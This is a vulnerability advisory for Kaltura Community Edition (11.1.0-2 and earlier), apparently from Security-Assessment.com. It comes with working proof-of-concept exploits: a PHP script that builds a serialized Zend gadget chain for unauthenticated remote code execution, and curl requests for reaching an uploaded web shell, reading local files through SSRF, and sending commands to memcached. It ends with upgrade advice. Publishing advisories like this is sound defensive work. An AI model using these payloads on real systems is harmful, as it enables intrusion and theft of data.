@@ -1,0 +1,108 @@
+(    , )     (,
+  .   '.' ) ('.    ',
+   ). , ('.   ( ) (
+  (_,) .'), ) _ _,
+ /  _____/  / _  \    ____  ____   _____
+ \____  \==/ /_\  \ _/ ___\/  _ \ /     \
+ /       \/   |    \\  \__(  <_> )  Y Y  \
+/______  /\___|__  / \___  >____/|__|_|  /
+        \/         \/.-.    \/         \/:wq
+                    (x.0)
+                  '=.|w|.='
+                  _=''"''=.
+
+                presents..
+
+Kaltura Community Edition Multiple Vulnerabilities
+Affected versions: Kaltura Community Edition <=11.1.0-2
+
+PDF:
+http://www.security-assessment.com/files/documents/advisory/Kaltura-Multiple-Vulns.pdf
+
++-----------+
+|Description|
++-----------+
+The Kaltura platform contains a number of vulnerabilities, allowing
+unauthenticated users to execute code, read files, and access services
+listening on the localhost interface. Vulnerabilities present in the
+application also allow authenticated users to execute code by uploading
+a file, and perform stored cross site scripting attacks from the Kaltura
+Management Console into the admin console. Weak cryptographic secret
+generation allows unauthenticated users to bruteforce password reset
+tokens for accounts, and allows low level users to perform privilege
+escalation attacks.
+
++------------+
+|Exploitation|
++------------+
+==Unserialize Code Execution==
+The following PHP POC will generate an object that leads to code
+execution when posted to an endpoint present on the server.
+Authentication is not required.
+[POC]
+<?php
+$init = "system('id;uname -a')";
+$cmd = $init.".die()";
+$len = strlen($cmd);
+$obj="a:1:{s:1:\"z\";O:8:\"Zend_Log\":1:{s:11:\"\0*\0_writers\";a:1:{i:0;O:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"\0*\0_eventsToMail\";a:1:{i:0;i:1;}s:22:\"\0*\0_layoutEventsToMail\";a:0:{}s:8:\"\0*\0_mail\";O:9:\"Zend_Mail\":0:{}s:10:\"\0*\0_layout\";O:11:\"Zend_Layout\":3:{s:13:\"\0*\0_inflector\";O:23:\"Zend_Filter_PregReplace\":2:{s:16:\"\0*\0_matchPattern\";s:7:\"/(.*)/e\";s:15:\"\0*\0_replacement\";s:$len:\"$cmd\";}s:20:\"\0*\0_inflectorEnabled\";b:1;s:10:\"\0*\0_layout\";s:6:\"layout\";}s:22:\"\0*\0_subjectPrependText\";N;}}};}";
+$sploit = base64_encode($obj);
+echo $sploit;
+?>
+------------
+
+The Base64 encoded object generated above should be included in the
+kdata section of the following curl request:
+
+$curl
+http://[HOST]/index.php/keditorservices/redirectWidgetCmd?kdata=$[sploit]
+
+==Arbitrary File Upload==
+Users authenticated to the KMC with appropriate privileges can upload
+arbitrary files through the "Upload Content" functionality. This can be
+used to upload a PHP web shell as an image file and gain command
+execution. In order to excute the code, the on-disk path of the uploaded
+file must be obtained, and then browsed to directly. Obtaining the
+uploaded file's path can be achieved with the following command.
+[POC]
+$curl
+http://[HOST]/index.php/keditorservices/getAllEntries?list_type=1&entry_id=0_3v2568rx
+-b "[Valid Cookie]"
+
+Directly accessing the path "url" returned by the above request will
+result in the exceution of the uploaded php script.
+
+$curl http://[HOST]/[URL PATH]
+
+==SSRF / File Read (Limited)==
+A limited number of files on the host can be read by passing a "file://"
+protocol handler to a CURL call.
+[POC]
+$curl
+http://[HOST]/html5/html5lib/v2.34/simplePhpXMLProxy.php?url=file://127.0.0.1/opt/kaltura/app/configurations/local.ini
+
+Arbitrary IP addresses can be supplied, resulting in an SSRF issue. The
+following POC uses the SSRF issue to send a command and retrieve
+statistics from memcached listening on localhost, which is present in a
+default Kaltura install.
+[POC]
+$curl
+http://[HOST]/html5/html5lib/v2.34/simplePhpXMLProxy.php?url=http://127.0.0.1:11211
+-m 2 --data $'b=set nl 0 60 4\n\n\n\n\n'
+$curl
+http://[HOST]/html5/html5lib/v2.34/simplePhpXMLProxy.php?url=http://127.0.0.1:11211
+--data "c=get nl&d=stats&e=quit"
+
++----------+
+| Solution |
++----------+
+Upgrading to the most recent version of Kaltura (11.7.0-2) will fix the
+majority of these issues. No fixes are available for some of the issues
+disclosed, so carefully firewalling off the Kaltura interface is
+recommended.
+
++------------+
+| Additional |
++------------+
+A disclosure timeline, further information and additional less critical
+vulnerabilities are available in the accompanying PDF.
+http://www.security-assessment.com/files/documents/advisory/Kaltura-Multiple-Vulns.pdf
